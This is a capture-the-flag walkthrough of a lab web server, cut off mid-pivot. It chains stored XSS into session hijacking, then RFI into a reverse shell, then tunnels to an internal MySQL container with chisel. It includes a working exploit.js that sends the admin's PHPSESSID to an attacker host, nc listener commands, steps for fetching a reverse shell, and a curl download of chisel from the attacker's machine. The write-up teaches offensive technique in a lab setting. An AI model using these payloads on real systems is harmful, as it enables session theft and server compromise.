## Foothold: Stored XSS

The username I register is displayed back inside the admin's review panel. If it's rendered without encoding, the username field is a stored-XSS sink.

### XSS via Username

Since my username was reflected, i used a simple XSS payload as the username and registered it for testing.

`username: <script>alert(0)</script>`
`password: 0101`

```bash
echo -n '<script>alert(0)</script>0101' | md5sum 
```

`md5 hash value:: 9180d1754aaec71c850b80021cc29f31`

`username: <script>alert(0)</script>`
`password: 9180d1754aaec71c850b80021cc29f31`

 and while logging in received an alert.

![xss](/assets/images/writeups/robots/6.png)  

So if the admin also interacts with the page and would also see a list of usernames, we could steal the admin cookie. This would allow us to enter the admin session.

Unfortunately, the `PHPSESSID` cookie is `HttpOnly`. The HttpOnly flag prevents JavaScript from accessing the cookie, making it accessible only through HTTP requests to protect against XSS attacks.

However, revisiting the `/harm/to/self/server_info.php` endpoint, we see that `phpinfo()` prints out the session details, including the P`HPSESSID` cookie in the variable `HTTP_COOKIE`.

So, instead of stealing the cookies directly, we can modify our XSS payload to request `/harm/to/self/` `server_info.php` and send its contents back to our server.

```username field — XSS payload
<script src="http://<attacker-ip>:4444/exploit.js"></script>
```

**The catch**: `config.php` sets `session.cookie_httponly = 1`, so `document.cookie` is off the table — the session cookie is invisible to JavaScript. But HttpOnly only stops JS from reading the cookie object; it does nothing to stop the browser from sending the cookie on a `same-origin request`. So instead of stealing the cookie, I make the admin's own browser fetch a page that `echoes the session id back` in its body, and exfiltrate that. s`erver_info.php` (phpinfo) dumps every cookie into the page, including `PHPSESSID`. (technique via HackTricks — "steal page content")

```exploit.js
var url = "http://robots.thm/harm/to/self/server_info.php";
var attacker = "http://<attacker-ip>:4444/exfil";  // it's a non-existing file.
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var match = xhr.responseText.match(/PHPSESSID=([a-zA-Z0-9]+)/);
        if (match) {
            fetch(attacker + "?cookie=" + match[1]);
        }
    }
}

xhr.open('GET', url, true);
xhr.send(null);
```
![payload](/assets/images/writeups/robots/7.png)  

I hosted the payload and catch the callback with a single static server.

```pyhton
python3 -m http.server 4444
```
![server](/assets/images/writeups/robots/7.1.png)  

Here initally the admin's browser pulls `exploit.js`, then it calls back with the stolen `PHPSESSID` in the query string.

The `404` on `/exfil` is expected and harmless. `http.server` has no such route, but it logs the full request line before answering — the cookie in the query string is already captured. No need for a real endpoint.

Now hijacking the admin's session by replacing our `PHPSESSID` with theirs.

Using the stolen session cookie, we navigate to `http://robots.thm/harm/to/self/index.php` and modified the cookie. I successfully logged in as admin, but nothing appears different on the dashboard.

![admin](/assets/images/writeups/robots/7.2.png)

## Exploitation: SSRF → Reverse Shell as www-data

Since logging in as admin didn’t reveal anything new, i used directory busting to enumerate hidden endpoints under `http://robots.thm/harm/to/self/` and discover `admin.php`.

```bash
gobuster dir -u http://robots.thm/harm/to/self/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50
```
![admin](/assets/images/writeups/robots/7.3.png)  

Navigating to `http://robots.thm/harm/to/self/admin.php`, I found a form that allows us to submit URLs

To test this, I submitted a URL to my own web server.

```bash
nc -lvnp 4444
```

```bash
http://192.168.132.76:4444 
```
![test](/assets/images/writeups/robots/8.png)  

I observe a request being made to my server. 

Since remote file inclusion is possible. Next, I created a PHP reverse shell using pentestmonkey and set up a listener.

i used this xss payload in the url input field `http://<attacker-ip>:5555/reverse_shell.php`. which then downloads it from the attackers server

```bash
python3 -m http.server 5555
```
whenever that `reverse_shell.php` gets executed it connects back to the attacker listener.

```bash
nc -lvnp 4444
```
![reverse-shell](/assets/images/writeups/robots/8.1.png)  

And yeeaah !, I got a shell on the server.
I got access to the server via chaining multiple vulnerabilities , `XSS` to `CSRF` to `RFI to RCE`

### DB Access: config.php

i wasted a lot of time trying to escape the container , i tried kernel exploits like OverlayFS (CVE-2023–0386) , with no success and started observing the web directory : `/var/www/html/harm/to/self/` and found the database credentials on `config.php`.

![reverse-shell](/assets/images/writeups/robots/8.2.png)  

By reading the `login.php` file I find that a connection is being made to a `mysql` server but it’s not open !.

So my first instinct was that db was just a local alias — but $servername = "db" in a config that phpinfo already told us was built under Docker is a strong tell. db is a Docker Compose service name, resolved by the internal Docker DNS to a separate container. Confirming with /etc/hosts shows this container is 172.18.0.3 — and db is somewhere else on that bridge network, unreachable from my attack box directly.

Meanwhile the database wan't on localhost — it's another container on a private bridge network. Expect to need a pivot rather than a direct connection.

### Pivoting to the Internal MySQL Container

I set up port forwarding using `chisel` to connect to the database from our local machine.

First, started the chisel server on my machine.

```bash
./chisel server -p 8888 --reverse
```

Next, transfering chisel into the container using curl

```bash
python3 -m http.server 80
```

```bash
curl -s http://192.168.132.76/chisel -o /tmp/chisel
```
